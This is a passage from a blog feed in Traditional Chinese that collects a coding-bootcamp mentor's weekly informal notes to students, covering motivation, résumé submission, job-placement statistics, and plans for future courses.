href="#第三十一週" class="headerlink" title="第三十一週"></a>第三十一週</h4><p>計劃已經超過兩百多天了，隨意聊也來到了三十一週<br>想對還在跟著計劃學習，或是正在找工作的同學們說一句話：<br>「你已經做得很不錯了」</p><p>我相信有很多人跟我一樣是個三分鐘熱度外加拖延症患者<br>這樣的我們，能夠做一件事情維持三十週，是很值得鼓勵的事</p><p>這個開頭看似接著會講一些很勵志的話，然後跟大家說千萬不要放棄<br>沒有，我不是這種人</p><p>我想跟大家說的是<br>如果真的很想放棄的話，放棄也是可以的唷<br>現在放棄，比賽就結束了，然後就輕鬆了<br>我是真心覺得要放棄也可以，但要先知道一件事情</p><p>大家有出去慢跑過嗎？<br>有人可能像我一樣連續跑兩公里就覺得不行了<br>然後就會想說：「就休息一下吧，不會怎樣，等等繼續跑就好了」<br>結果明明還有體力，卻走了三十分鐘才繼續跑<br>整趟十幾公里的路程可能只有兩三公里是用跑的，其他都用走的</p><p>慢跑一旦停下來，就很難重新跑起來了<br>而且重點是這樣跑跑停停，你只會更累<br>因為每一次重新跑起來都需要很多動力，所以需要的精力是大於持續跑步的</p><p>學習也是這樣<br>你看計劃中有幾個同學中途去休假<br>結果假一放完就再摸魚個幾天才重新歸隊，而且剛歸隊的時候超級不適應<br>這就是停下來以後再開始跑的後果</p><p>所以，如果你想放棄了，是完全可以的<br>但如果你心裡是抱持著「沒關係，現在放棄了還有以後嘛」的想法<br>你要知道的是，可能就沒有以後了<br>可能這次放棄之後，你要等到一個千載難逢的機緣才會繼續開始學程式<br>而且到那個時候，很有可能你早就忘光你學過了什麼<br>大家可以想一下，是要繼續跟著學習還是要放棄<br>但無論你做什麼決定都是可以的，要繼續也可以，要放棄也可以<br>世界無限寬廣，就算放棄了還是可以找其他事情來做</p><p>然後之前我有說過，希望大家只要進度不要太落後，都可以在結業前去投履歷試試看<br>千萬不要覺得什麼「等我準備好了」，因為你很有可能過了一年都不會覺得自己有準備好<br>Pablo 同學之前的心得就有寫過：<br>「在寫 final project 時我一度想放棄，就是什麼都不想做，覺得自己超爛沒動力。這時候我發現自己的逃避病又跑出來了，內心開始有小小逼自己出去求職的想法，最後是 Huli 推一把才決定出去投履歷的。」</p><p>你不需要「很好」才能找到工作，只需要「好」就可以了<br>進度在 17 週後面的同學們可以開始寫寫履歷了<br>寫履歷碰到問題可以來問我或是問已經找到工作或正在求職的同學們<br>我們目標就下禮拜天去完分享會開始投履歷吧<br>那時候一定是最有動力的時候</p><p>然後希望大家都能在十二月中以前拿到 offer<br>大家一起發大財！（這什麼庸俗的結尾）</p><h4 id="第三十二週"><a href="#第三十二週" class="headerlink" title="第三十二週"></a>第三十二週</h4><p>感謝同學今天的參與～<br>沒有參與到的同學也可以加減看一下上面貼的那兩個畫質很差的分享影片<br>有一些原本漸漸失去動力的同學，相信今天的聚會可以多少把動力補回來<br>也有一些進度已經到後期（十七週），卻還跨不出去那一步，一直在猶豫什麼時候要投履歷的同學<br>就像我今天建議的一樣，我的答案就是「今晚就把履歷投出去」</p><p>理由很簡單，因為今天會是你最有動力的一天，過了今天就不知道要等到何時了<br>先把履歷投出去，其他的之後再說<br>投履歷跟面試也都是另一種方式的學習，你只是在跟課以外探索新的學習方式而已<br>反正也沒什麼心理上的壓力，沒人說投履歷就一定會找到工作<br>如果找到工作那很好，沒找到也可以當成理所當然，就繼續慢慢跟著課程<br>但如果不投的話，你永遠不會知道是自信問題還是能力問題<br>也不會知道未來到底要往哪個方向去準備<br>所以投就對了，今天把履歷投出去，等著收信安排面試時間</p><p>然後順便提醒大家一下，隨意聊只剩下三次了<br>因為下下下週日，12&#x2F;15 日是這個計畫的最終截止日<br>在那個週末我就會對外 po 第三期成果（求職成功人數）以及心得文了</p><p>你想想，如果你今天不投履歷，那要什麼時候投？<br>兩三個禮拜後嗎？那時候計畫結束了，動力一定更減弱，然後就繼續拖著<br>可能就這樣拖了兩三個月，搞不好就放棄了</p><p>有些人可能擔心太早投履歷會壞了 Lidemy 的名聲<br>但一來 Lidemy 也沒什麼名聲，二來一個班級本來就有各種程度的人，這很正常<br>三來第四期暫時不開了，也沒有多少人會被影響到；四來對我也沒影響，因為我都找國外的工作<br>所以這點倒是不太需要擔心</p><p>對於猶豫不決的事，你需要的本來就不是理性<br>如果理性可以幫你決定的話，早就做決定了<br>你需要的是感性，需要的是一些衝動</p><p>只要你進度在十七週以後而且想要當工程師<br>我知道你課程沒跟完，我知道你 React 還沒學，我也知道你沒做 final project<br>還是請你勇敢地把履歷投出去</p><p>可以想一下，最慘的狀況是什麼？<br>就是面試被洗臉，然後暫時沒辦法轉職為工程師</p><p>咦，那不就跟現在一樣嗎<br>你現在也不是工程師，所以其實沒有損失任何東西<br>反而還賺到了面試的經驗，也知道未來要往什麼方向去做準備<br>真的是賺賺賺</p><p>總之，這週隨意聊就是這樣啦<br>期待大家都能投出履歷，然後在 spectrum 以及學習系統上分享面試心得<br>祝大家面試順利～</p><h4 id="第三十三週"><a href="#第三十三週" class="headerlink" title="第三十三週"></a>第三十三週</h4><p>前幾天有挨家挨戶（aka 私訊）拜訪了一下進度在比較前面，我覺得可以來投履歷看看的同學<br>如果沒有拜訪到的應該是沒有求職意願，或是忘了在系統更新自己的進度<br>或者是已經開始出去求職了</p><p>這邊再簡單講一下我的想法好了，以及再幫大家理性分析一下我推大家出去面試的原因<br>先假設一下如果出去面試真的成功了，有什麼好處</p><p>對我來說，好處有以下：<br>1. 可以收到學費<br>2. 計畫轉職成功人數增加<br>3. 找到工作了，替你開心</p><p>對你來說，好處是：<br>1. 成功轉職為工程師，目標達成</p><p>那如果面試成功了，有什麼壞處？沒有。</p><p>再來假設面試一圈結果都沒有錄取，好處是什麼？<br>1. 有過面試經驗，下次面試不會那麼緊張<br>2. 知道自己在市場上的定位<br>3. 從面試的回饋得知需要加強的地方（例如說還是要有作品，還是要會 React 等等）<br>4. *讓你維持學習的動力</p><p>壞處是什麼？<br>1. *可能會更失去自信心，深受打擊（？</p><p>好處的第四點其實是我推大家出去面試的主因<br>計畫結束對大家來說最大的影響就是人數一定又會變少<br>現在已經不多了，再少的話就又更少了<br>進度比較慢的同學一定知道走在後面的辛苦，一個人孤軍奮戰著<br>如果時間拖更久，那動力只會越減弱，跟的進度只會越來越慢</p><p>那要怎麼維持這個動力？強迫自己動起來就好了。<br>怎麼強迫自己動起來？投履歷。</p><p>履歷一投出去，面試電話一接起來，你就要安排面試，就要準備面試<br>無論會不會上，都會被逼迫著準備面試，因為你知道不準備的話就是被電<br>然後履歷不要只投兩三間，就算你把 24 週課程修完，只丟兩三間也很有可能 0 間找你面試<br>請把數字*10，投個二三十間，投到有人找你去面試為止<br>把投履歷以及面試當作是第三十三週的課程內容，換個方式學習而已</p><p>好，那如果你一直很有動力，一直有在跟著自己的步調前進呢？<br>那你不投也可以<br>如果你很確定自己有在前進著，而且課程結束以後依然會繼續前進<br>那就不用急著在這個時候求職，照你自己安排的時間即可</p><p>但我相信大部分的人應該不是這樣<br>因為很多人都卡在 17, 18 週左右，很久沒有繼續前進了</p><p>再來我們談談求職失敗的壞處：失去自信心<br>這個就很看個人的個性了，像我就覺得無所謂</p><p>或是換個角度想，我們先來想一下為什麼有些進度比較前面的同學不敢出去面試？</p><p>1. 覺得自己一定找不到工作<br>2. 覺得還沒學 React，沒資格面試<br>3. 覺得沒有作品，沒資格面試<br>4. 覺得課程還沒跟完，沒資格面試</p><p>以上四點總結為一句話就是：沒有自信心<br>阿本來就沒有自信，求職失敗之後哪會「失去自信心」？<br>你已經沒有什麼好失去的了</p><p>對求職應該要保持這個心態：<br>求職成功：我果然比想像中厲害，自信應該高一點<br>求職失敗：我就說嘛，跟我想的一樣，求職失敗是因為…（請填入各種原因）<br>那我只要把課程跟完，找到工作的機率就會高很多了！<br>勝不驕敗不餒大概就是這樣的一種感覺</p><p>但再次提醒大家，心理準備要先做好<br>如果你還是很怕面試被打擊然後信心全失<br>那我也會建議你最好不要現在去面試</p><p>不過老實說，最好的求職時機點是什麼？<br>當然是課程全部跟完外加做 final project 做完以後<br>退而求其次，就是課程跟完但沒有 final project<br>再來就是只學了 21 週的 React<br>再來就是只到 17 週，把面試常考的那些 JS 給搞懂</p><p>所以你現在在的進度，顯然不是「最好的求職時機點」<br>那為什麼我還是推大家出去面試？<br>請大家摸摸自己的良心，問自己一個問題：「我撐得到最好的求職時機點嗎？」<br>在計畫結束，同學各自散去以後，你能繼續把課程跟完，然後做出 final project 嗎？<br>如果答案是 Yes，那就 walk at your own pace，跟著自己的步調走<br>忽略我上面講的，等待你跟完課程再投履歷就好</p><p>但如果答案是 No 呢？<br>是不是就只能退而求其次，接受還沒準備好的自己，藉由外力給自己一點動力？</p><p>先講一下我最不想看到的情況是什麼<br>就是假設你進度跟到 20 週好了，然後不管我怎麼講都還是沒有說動你<br>因此你沒有投履歷，沒有面試，但也沒有繼續跟課，也不知道該怎麼做<br>然後 12 月中到了，課程正式結束了，你依然在思考接下來該怎麼辦<br>或許之後繼續開始跟課了，但一個禮拜過去，影片才看了一個單元<br>接著聖誕節、跨年、農曆過年，轉眼間就二月了<br>當你再次打開之前沒看完的影片，你傻住了，因為發現全忘光了<br>然後工作越來越忙，或者是突然有其他事情要處理<br>就這樣拖著拖著，發現有一天你想重新寫程式的時候，你回不去了<br>那時的你已經從 0.8 回到了 0，只能再次挑戰從 0 到 1<br>可想而知，那樣的難度又更高了<br>最後，你可能短期內達成不了轉職成工程師這個目標<br>全劇終</p><p>為了避免以上這種情形，我覺得投履歷去面試是一個好方法<br>面試被電很慘嗎？沒拿到 offer 很慘嗎？<br>對，可能頗慘，但有比上面那個故事的結局慘嗎？我覺得是沒有</p><p>如果你很有自信不會變成上面那樣<br>很確定自己可以維持節奏繼續跟課，直到你心中理想的「求職時機」<br>那我覺得不投履歷不面試沒關係，繼續跟著自己的步調走</p><p>但如果你不確定，如果你覺得我上面講的很有可能發生在你身上<br>那還是強烈建議大家投個履歷面試一下<br>然後記得在每日心得寫一下近況，我才知道你出去面試或是有在安排面試了<br>面試心得請發在 spectrum（雖然排版很爛），感恩感恩</p><p>最後，雖然我上面講了那麼多<br>但你要知道的是，最後要不要去求職還是你的選擇<br>你不需要跟著我的期望走<br>若是最後你去求職，原因一定要是你聽我說完之後，覺得真的求職比較好而去<br>而不是因為「老師叫我去求職，但我其實不知道為什麼」</p><p>這應該是最後一次推大家出去求職了，祝大家順利～</p><h4 id="第三十四週"><a href="#第三十四週" class="headerlink" title="第三十四週"></a>第三十四週</h4><p>這週隨意聊先來分享一下一些簡單的統計數據<br>以下數據都來自於學習系統上面的進度而不是交作業的進度<br>所以有可能會因為沒有在系統上面更新所以不準XD</p><p>先來看一下兩個月前的進度（45 人扣掉工程師加強班 6 人，一共 39 人）：</p><p>21<del>24 週：15 人 <br>16</del>20 週：7 人<br>11<del>15 週：9 人<br>06</del>10 週：8 人</p><p>兩個月前跟大家說最保守的估計是進度在最前面的只有 10 個人在期限內找到工作<br>加上之前已經就業成功的 3 個同學，找到工作的人就是 33%</p><p>然後說我比較希望的是進度在前面的有 20 個可以找到工作<br>這樣找到工作的人的比率就是 58%</p><p>接著來看一下目前的數據：</p><p>進度分佈：<br>21<del>24 週：18 人（+3）<br>16</del>20 週：8 人（+1）<br>11<del>15 週：6 人（-3）<br>06</del>10 週：7 人（-1）</p><p>在 11<del>15 週這個區間有 2 人找到工作（比較早找到工作的同學，然後應該是之後學習系統沒更新）<br>在 16</del>20 週這個區間有 2 人找到工作（一樣是比較早出去工作的）<br>在 21~24 週這個區間有 8 人找到工作</p><p>所以目前找到工作的一共有 12 人<br>好…比我最保守的估計還要少，完全失算 ?</p><p>進度在前面的那 18 人，大家應該也滿好奇其他 10 人的狀況，大致上分成三種：</p><p>正在求職中：4 人<br>聯絡過說要投&#x2F;已經在投&#x2F;之後投但消失了：4 人<br>沒有求職意願：2 人</p><p>之前有說過我有把進度在前面的同學聯絡過一遍<br>消失的定義指的是在學習系統上消失好一陣子了，所以我也不知道近況為何<br>我也不知道是不是真的開始投履歷了，不知道有沒有面試，有沒有拿到 offer<br>然後沒有求職意願就是因為種種個人因素所以暫時沒打算找工程師的相關工作</p><p>總之呢，從這個狀況看起來<br>最後能夠在期限內轉職成功的人大概就是 12<del>16 個<br>以比例來計算就是 30</del>40% 左右，是有比上一期高一點啦 ?<br>兩個月前的估計失準最大的原因大概是沒有算到消失跟沒有求職意願的人<br>否則我覺得那 6 個也是滿有機會的，之前所說的 20 個人成功也有希望</p><p>以上是關於這個計畫的進度報告<br>再來就是再跟大家提醒一下，下週是這個計畫的最後一週<br>計畫截止日期為 12&#x2F;15 下禮拜日<br>所以那些正在求職的同學們下週如果沒拿到 offer 的話，就失去繳學費的機會了XD</p><p>然後呢，無論有沒有轉職成功，都請花一些時間幫我寫一下課程心得～<br>感恩感恩</p><h4 id="第三十五週"><a href="#第三十五週" class="headerlink" title="第三十五週"></a>第三十五週</h4><p>大家安安，今天是這個計畫的最後一天，也是最後一篇隨意聊<br>先來講一下課程相關的部分，列入數據的有 39 人，有 14 人找到工作，成功率為 35%<br>依照當初簡章講好的規則，沒有找到工作的同學們就不用付學費了<br>但如果你覺得會欠人情什麼之類的依然想要付學費也可以，到時候再私訊我即可<br>當初繳交的保證金 5000 塊可以退，但退了之後就會從這個計劃被移除<br>連帶 spectrum 跟 lidemy 上的課程都會一起被拿掉，就像是沒有參加這個計畫過<br>有想要退的可以再私訊我～<br>沒有退的話就是保持原狀，之後交的作業我依然會改<br>再來附上已經對外公開的第三期心得：[&#x2F;2019&#x2F;12&#x2F;15&#x2F;mentor-program-3rd-result-df178bb55f4&#x2F;)<br>在這邊的隨意聊就來講一些上面沒有寫到的<br>每一期的學生組成其實都很不一樣，而這一期如果你問我最開心的是什麼<br>大概就是看到很多同學找到理想中的工作吧<br>之前我有說過，找到工作不難，難的是找到適合的、你也想做的工作<br>所以有達成這個目標的話，是很值得開心的一件事<br>還有另一件滿開心的事就是收穫了很多心得，無論是技術上的或是課程上的心得<br>這些都對我很有幫助<br>但你在寫的時候其實不需要特別注意「對我是不是有幫助」，你就寫你的就好了<br>因為無論如何，我都能從中擷取到對我有幫助的片段<br>寫越長越好，因為我很喜歡看長文（畢竟自己本身也很喜歡寫長文）<br>第三期做了很多新的嘗試，有的成功（複習週、學習系統），也有的沒那麼成功（spectrum、課程作業）<br>但整體計畫依然是在往好的方向走，而且只會愈來愈好<br>雖然說短期內沒有再開第四期的打算，但這些經驗都可以應用在之後課程的改進<br>在這些改動裡面，若是只能挑一點出來講，我最喜歡的一點應該是小樹屋吧<br>實體的空間與接觸還是有其不可取代的性質<br>雖然說這是個以線上為主的課程，但若是能在線下也建立起一個社群，成效會好很多<br>然後，在今天結束以後，對大家來說才是考驗的開始<br>當你沒有了社群、沒有了學習系統、沒有了課程或是老師，你該怎麼自立自強？<br>對已經出去工作的學生來說，這是一個問題<br>對還在繼續學習的同學來說，這更是一個問題<br>因為我之前跟大家預告過了，計畫結束以後人只會愈來愈少，會讓你更難獨自往前<br>但有問題依舊可以來找我，或是也可以私訊那些曾經走過一樣的路的同學們<br>感謝大家的參與<br>就祝大家之後順利啦～</p><h4 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h4><p>以上就是共三十五週隨意聊的所有內容，有些週內容偏題太大就沒有放上來了，想說可以節省一點版面，不然文章也是挺長的。</p><p>放這些的原因一來是覺得就這樣不見也是挺可惜的，二來是想讓以後想報名這計畫的人可以看到平常我都跟學生講一些什麼話，如果講的話你有認同或是有共鳴再來報，若是光看這些就覺得跟我很不合，那就沒有報名的必要。</p><p>大概就是這樣。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式導師實驗計畫隨意聊總集（中）</title>
      <link href="/2020/01/13/weekly-note-part2-20fb2472d432/"/>
      <url>/2020/01/13/weekly-note-part2-20fb2472d432/</url>
      
        <content type="html"><![CDATA[<p>上集在這邊：&#x2F;2019&#x2F;12&#x2F;26&#x2F;weekly-note-part1-197335682a61&#x2F;</p><h4 id="第十四週"><a href="#第十四週" class="headerlink" title="第十四週"></a>第十四週</h4><p>終於回到台灣了！但一從機場出來就後悔了，好熱…<br>這週來分享一點不一樣的，跟這個計畫本身有關的幾件事情</p><p>第一件事情是讓我心灰意冷（？）的時刻，就是改作業看到有同學交了很爛的 code 上來，有幾次居然就是看到有點小生氣，想說寫這什麼爛 code。</p><p>但我當然也不會直接留言說你寫一堆垃圾，因為我不覺得那是件正確的事。在感性上我的確是有點生氣的，但這種被感性牽著走的時候冷靜一下才是正解。</p><p>冷靜完就會想說：他寫爛 code 是誰的錯？是他的錯嗎？還是我的錯？看到爛 code 真的有必要生氣嗎？誰沒有寫過爛 code？背後就有很多核心的問題可以去思考。</p><p>然後看到爛 code 的當下就會想說改作業好累，不想再開下一期了 XDD 不過冷靜過後就好很多了，可以比較去理性地思考一些問題。我不認為去責怪學生寫爛 code 是件對的事，因為他很有可能根本沒意識到這件事。</p><p>如果老師只會責怪學生，那到底要這個老師做什麼？之前我提過同理很重要，大家一定都經歷過學校老師把私人情緒帶上課堂，若是以前我們就知道這樣是不對的，那怎麼可以自己長大之後也變成這樣？</p><p>所以我認為比較正確的做法可以是：</p><ol><li>讓他知道他寫的是爛 code</li><li>讓他知道可以怎樣優化</li><li>讓他知道寫爛 code 是人之常情，不用太灰心</li></ol><p>這樣好像才是真正有解決到問題。</p><p>第二件事情是老生常談了，就是教學深淺以及詳細與否的抉擇。</p><p>有些時候都會在 lidemy 動態時報上看到有些人卡關卡很久，或是覺得課程不夠詳細，有些東西沒有教到，這個時候我就會經歷一波自我辯證。</p><p>這樣的教學到底是不是好的？</p><p>課程內容部分留白有可能是因為真的忘記講，也有可能是我故意留的，因為我覺得你應該要從課程有講的 A 跟 C，自學 B 之後把 ABC 三個搭在一起用；如果我 ABC 三個都講了，那就等於是直接奪去了你自學的空間，你就只是看我的影片然後抄我的程式碼而已。</p><p>但有時候我又會認為，時候真的到了嗎？會不會現在這個階段就是需要我把 ABC 都講清楚，把基礎都打好，等到五週十週過後基礎建立起來，才慢慢把課程留白，留一些東西讓學生自己學習？</p><p>這個的標準真的很難拿捏，我記得以前教學心得講過超級多遍類似的問題<br>，我最近得到了一個新的啟發！</p><p>有時候在 A 跟 B 之間做抉擇之所以困難，是因為兩個只能取一個，但你有沒有想過，搞不好可以兩個都拿？</p><p>意思是說我可以有 leve1 的課程，大概講五成內容，看完就可以嘗試寫作業了，如果作業寫不出來，可以再看 level2 的課程，再講另外三成，看完一樣寫作業。</p><p>還是寫不出來就看 level3 的課程，十成全部講完，直接一步步帶你做範例跟作業之類的，這樣好像就能解決這個深度拿捏跟自學與否的問題。而且就算你看完 level1 就寫完作業，level2 跟 3 你還是可以當成補充資料來看，也可以把自學的內容再複習一遍順便當作檢討作業。</p><p>聽起來好像很不錯欸，大家覺得呢？<br>（不過要做的話應該也不會是這一期就對了 XDD）</p><p>第三件事情是這個計畫的後續發展</p><p>剛好前幾天收到一兩封信問我第四期的消息，我都回說每一期都是結束之後才在想要不要繼續開，所以下一期也要等第三期結束才能確定會不會有。</p><p>目前是傾向應該不會有下一期了，主因是我年底要來準備找工作啦！所以我自己要修煉一段時間，不太可能再分神出去帶一波全新的學生。</p><p>不過我本來就有兩個打算，但只是個想法而已還沒確定要做，首先是我想把這個計畫的課程變成一個自動的系統來解決一些存在已久的問題。</p><p>第一項就是把之前錄的線上課程再 review 一遍然後全都開出去賣。解決的問題是有些人只想學某項技術，不想學整套課程，就可以單買線上課程。</p><p>第二項是把這整個「程式導師實驗計畫」做成一個系統。</p><p>有點像遊戲那樣，大概設計個五十關，然後每一關都會有導讀跟作業<br>不會有手把手教學，所以如果你需要教學可以自己購買相對的線上課程<br>導讀大概可以分成幾個：</p><p>1. 本週目標與作業規格說明<br>2. 作業解答與示範<br>3. 常見作業問題及重點概念加強</p><p>第一個本週目標與作業說明是公開的，後兩個要付費解鎖，意思就是說你只要註冊會員，不用花錢也可以自己玩這整套系統，但如果你想要我改作業，想要解答與示範跟重點加強的話就要付費。</p><p>想說前十關可以全部都免費，確定上的習慣之後再來收錢，一關 500 塊，一次買五關 2000 塊之類的，反正都可以再想。</p><p>做成系統的好處就是以後不用再分期，你隨時想來都可以自己開始，但缺點就是如果人不夠多而且大家進度都不同，可能有點孤獨（？）</p><p>再來淘汰制的話應該也會直接取消，或者改成如果願意接受淘汰制，學費比較便宜之類的，但如果被淘汰就進度歸零然後要重來，好像也滿有趣的。</p><p>然後收費方式也不同了，好像不能再做像現在這種就業才繳錢的收費模式？<br>我剛想一下好像還是可以，不過有些奇怪就是了，例如說如果你自己買課程整套是兩萬塊，但就業才繳錢要付到六萬，這差距就有點太大，感覺會選前者的人比較多？總之定價可以再想想</p><p>每日進度報告會留著，然後一樣看到其他人的進度報告，這樣就算變成系統，沒有分第幾期第幾期也不會感到太孤單，總之大概就是這樣的一個學習闖關系統。</p><p>如果我哪天突然小宇宙復燃，就不會有第四期而是有這個系統了，但一想到要寫這樣的東西就覺得好麻煩，而且還有金流的問題要處理…</p><p>再來第二個打算是我想換個方式準備面試，一個人準備面試我一定會偷懶，所以想找個方式強迫自己，想到的解法是開一個期間限定的付費方案，可以收月費或是一次繳清之類的，例如說一個月 500，可能連續兩三個月</p><p>付了之後可以幹嘛呢？第一個是加入專屬社團討論面試相關問題，第二個是我至少每週會出一篇 JS 或是前端基礎相關題目的文章</p><p>這就是我逼迫自己的方式，因為大家付了錢所以我就要邊準備面試邊寫文章<br>但我又不希望這些文章永遠鎖在這裡，所以結束之後我會全部對外公開這些文章，付錢的好處就是早買早享受而已</p><p>然後我沒有想要靠這個賺錢，我只是很好奇有誰會付費而已，既然沒有想靠這個賺，我想把收入全部捐給社群，看能夠贊助哪些社群活動之類的，不過要做的話，要捐哪些技術社群也是很值得討論的一部分</p><p>雖然開頭只講有兩個打算，但在寫的時候我又想到一個，可以來做一個「真正的」mentor 計畫，對象是工程師然後有名額限制，全部免費，但你要完成任務否則就會淘汰你</p><p>任務都會是一些我覺得對技術社群有幫助的任務，例如說每個月寫一篇技術文章，主題要跟我討論，我會幫你 review，或者是像我們之前複習週那樣寫一個小遊戲讓大家從中作學，也有可能是寫個開源專案之類的</p><p>看你想做什麼我都可以輔導你，但要是我覺得對大眾有利或是好玩的東西<br>想永續發展的話可以加個條件是一年以後你必須也開同樣的計畫去帶人之類的，想到就覺得很好玩，有種不斷拉下線的感覺 XDD</p><p>最近的想法大概就是這樣，跟大家分享一下<br>大家有想到什麼 idea 也可以跟我分享</p><h4 id="第十五週"><a href="#第十五週" class="headerlink" title="第十五週"></a>第十五週</h4><p>自從回台灣以後，最近自己也陷入了什麼都不想做以及拖延症的困境當中。</p><p>環境是很重要的，你要知道什麼樣的環境適合自己，然後千萬不能嘴硬。例如說我知道我待在家就什麼事都做不了，工作效率極差，今天找了個 coworking space 待了一整天才有這一週的隨意聊，不然我一定直接怒拖個一週，下週再說 XDD</p><p>今天是計畫的第一百天，哇，居然一百天了！</p><p>學生人數從原本的 62 人到現在剩下 53 人，有 14% 的人被淘汰掉（其實比我想像中的少），進度的部分越來越分散就不特別講了，從第二週到第十八週都有人（有些可能是忘記按進度了），每個人卡關的地方也都不太一樣。</p><p>總之呢，能堅持一百天已經頗厲害的了。</p><p>上次跟大家說的那幾個之後的打算，經過一個禮拜的思考之後，第四期跟學習闖關系統會出現的機率都偏低，甚至連把線上課程拿出去賣的機率也都頗低，因為好麻煩喔。</p><p>面試準備訂閱制那個有很高的機率之後會做，等我從歐洲回來就會有決定了，真正的 mentor 計畫那個我這周四會去台南好想工作室，想說在那邊順便把這計畫公開試試水溫（？）</p><p>我簡介跟文案都寫好了，就只差發文而已，不過對象會是已經是工程師的人，所以大家暫時沒機會 QQ</p><p>這週大概就是這樣，沒什麼特別的心得可以分享，最近就是在規劃二十週以後的課程，基本上 21~24 這四週會分前後端，你可以任選一個，或如果你有時間的話兩個都選也 ok，我自己其實也是希望大家兩個都選，這樣子之後有什麼 side project 想寫都可以自己搞定，十分方便。</p><h4 id="第十六週"><a href="#第十六週" class="headerlink" title="第十六週"></a>第十六週</h4><p>不知道為什麼，最近覺得心挺浮躁的<br>可能是因為拖延症還在繼續發作吧<br>上禮拜才跟大家講說回台灣之後就一直拖延，拖到現在還在拖<br>不過我早就預測到現在的情況了<br>才會趕在計畫開始前，我還在新加坡的時候把大部分導讀都錄好<br>因為我知道自己回台灣絕對拖延到爆，真是知己知彼百戰百勝（？）</p><p>我覺得拖延的原因跟環境有滿大的關係<br>待在家裡既沒辦法百分百專心，也會因為一直想做事導致沒辦法進入發散模式，所以做東西挺沒有靈感的，不知道要從何開始<br>nodejs 後端的課程也都還沒開始錄，稍微拉了一下課程大綱也沒有很滿意<br>或許要再找時間跑去 coworking space，不能再待在家裡了<br>不然時間都浪費掉了嗚嗚</p><p>最近有引發思考的是我新的那個前端引路人計劃<br>大概收了二十封信吧，有其中一半我直接先回絕了，剩下還在想<br>跟這個計畫一樣，每次到報名階段就會不斷去思考到底要收什麼樣的人<br>是要收基礎好的人嗎？可是如果基礎好的話他來這邊幹嘛？是不是我能幫助到的就有限？<br>那要收基礎不好的人嗎？可是基礎不好來這邊幹嘛？怎麼不讓他們先去把基礎弄好再來，這樣我能幫到的東西會比較多？是要找跟我以前一樣沒人帶的人嗎？可是這樣的人很多，那要怎麼篩選？還是說為了長遠發展，應該找有潛力又有基礎的人，這樣才能在一年後發揮最大效益？<br>好麻煩，但我昨天睡覺的時候大概有比較想通一點，雖然簡章上面說收 5 個，但我預計可能會收到 20 個…（每次都面臨超收的下場）</p><p>再來是之前跟大家提過可能不會有第四期<br>主要原因是我之後可能會很忙（？）<br>因為最近也一直在想 11 月旅遊回來以後要幹嘛，原本方向比較堅定的就是準備一下之後開始找工作，但其實我本來就有一件事滿想做的，就是閉關修煉之類的，這個詳情以後再說<br>但總之如果選了這個，好像就會有比較多時間，第四期就可以再繼續開</p><p>講到旅遊，九月要出國了<br>但行程住宿什麼我全部還沒訂，一想到這些就好麻煩喔嗚嗚<br>尤其是對歐洲地理不熟，國家之間都要查一下怎麼連接比較方便<br>在國家內也要想一下要去哪些點，一想到這些就覺得真 d 麻煩<br>不過再拖下去就麻煩了，因為很多東西都要事前排好比較好</p><p>除此之外最近其實偶爾會有小想法蹦出來，想說先記著，真的很想做的話以後再做<br>例如說想做個 cs50 的銜接課程，會像線上課程那種形式<br>有點想做成不用看 cs50 的影片就能夠寫作業<br>大概就是想把裡面講到的概念自己再講過一遍，順便補上一些原本沒講的基礎知識<br>然後再把作業翻成中文<br>這樣英文不好的人也可以透過這堂課完成 cs50<br>應該會滿有趣的</p><p>不過想法多其實也沒什麼用，畢竟你想過的東西別人早就想過了<br>真正重要的是執行力，這才是重點<br>想是沒有用的，沒有執行就什麼都沒有<br>花一年想一個自以為天衣無縫的計畫，不如花一個月想之後就直接開始做<br>然後邊做邊調整，最後出來的結果會比那不堪一擊的紙上談兵還好</p><p>突然又想到一個可以講的（希望不要這週講太多下週只能尬聊）<br>之前看丁丁跟六角的洧杰在談信任與權力下放這件事<br>這個也真的是我要學習的一部分<br>這門課之所以沒有「真的助教」（花錢請來的）就是因為我還是不太放心<br>我不確定助教能不能提供有品質的回答以及抓到真正的盲點<br>所以還是都自己改作業，沒有想要找助教的打算<br>但作業一多的時候真的是很想找個助教來幫我改，我會省很多時間<br>不過在這之前可能要向六角或 AC 取經一下，看看他們怎麼規劃助教機制的</p><p>最後來講點課程的東西好了，我近期頻繁更新我的 repo<br>加了一些資料然後 20 周以後的課程也會改來改去的<br>目前大概算完成 70% 吧，有想先同步的可以先同步<br>全部完成之後會再跟大家說，讓大家統一同步一次</p><p>這週隨意聊真的挺隨意的<br>差不多就是這樣吧</p><h4 id="第十七週"><a href="#第十七週" class="headerlink" title="第十七週"></a>第十七週</h4><p>特！別快報，我這幾天居然克服我的拖延症了！<br>原因大概是有同學進度已經到十九二十週了，再拖下去就開天窗了 &#x3D; &#x3D;<br>所以這幾天特別具有生產力，把二十週以後的「後端課程」給錄完了<br>一並把作業什麼也都弄好了，所以後端課程的部分已經全部規劃完畢</p><p>原本二十週以後分前後端是希望讓大家選自己喜歡的<br>但我後來發現一個致命問題，那就是我覺得後端深度不夠深<br>儘管你選了後端，我覺得離找工作還有一點點距離，還要再去補其他東西<br>這邊先讓大家知道一下這點</p><p>所以我會建議大家如果有時間可以前後端都跑過一遍<br>因為後端介紹的深度也沒有很深，對以後做任何專案也都很有幫助<br>但如果有時間壓力的話，那就選自己喜歡的吧，不用兩個都選</p><p>然後這邊建議進度超前的同學先從後端開始，因為前端的課程還沒完全弄好<br>再給我一些時間 霸拖 QQ<br>這段時間你們就先再學一下後端的東西，其實也很有趣，真的</p><p>之前跟大家提過的一些 idea 後來都在我心中慢慢發酵<br>目前最想做的是那個 cs50 補完計畫，方向越來越明確<br>不過還是一樣先放著，哪天真的想做再來跟大家講</p><p>這邊先宣導一件事情，那就是淘汰制依然存在<br>昨天我有撈了一下資料，有大概一兩個同學在淘汰邊緣，所以我先提醒了一下<br>你各位記得 po 進度報告啊，基本上有 po 